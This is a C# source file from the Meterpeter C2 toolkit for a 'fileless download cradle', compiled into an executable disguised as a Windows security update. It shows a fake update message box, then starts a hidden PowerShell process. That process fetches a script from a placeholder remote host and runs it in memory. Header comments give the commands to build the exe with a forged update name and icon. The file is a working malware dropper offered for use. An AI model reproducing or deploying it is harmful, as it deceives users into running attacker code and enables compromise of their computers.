/*
   Author: @r00t-3xp10it
   @Meterpeter C2 v2.10.11 - FileLess download crandle!

   Title: StandAlone executable cmdlet FileLess download crandle.
   Description: Program.CS (to be compiled to standalone executable) that allow users to FileLess download\execute external URL's cmdlet's
      
   Dependencies: iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CsOnTheFly.ps1" -OutFile "CsOnTheFly.ps1"
   Compile: .\CsOnTheFly.ps1 -action "compile" -uri "FileLess_KB5005101.cs" -outfile "Update-KB5005101.exe" -filedescription "KB5005101 21H1 Security Update" -iconset "true"
*/

using Microsoft.Win32;
using System;
using System.Linq;
using System.Windows.Forms;
using System.Diagnostics;

namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           // Social Engineering MessageBox - Security Update Disclamer.
           MessageBox.Show("This update makes quality improvements to the servicing stack, which\nis the component that installs Windows updates. Maintaining Stack\nUpdates ensures that you have a robust and reliable maintenance stack\nso that your devices can receive and install updates from Microsoft.", "KB5005101 21H1 Security Update");
           var filePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";

           Process process = new Process();
           process.StartInfo.FileName = filePath;
           process.StartInfo.Arguments = "$VPNsockEt=New-Object -ComObject MsXml2.ServerXmlHttp;$VPNsockEt.Open('GET','http://CharlieBrown/Update-KB5005101.ps1',0);$VPNsockEt.Send();[scriptblock]::Create($VPNsockEt.ResponseText).Invoke()";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}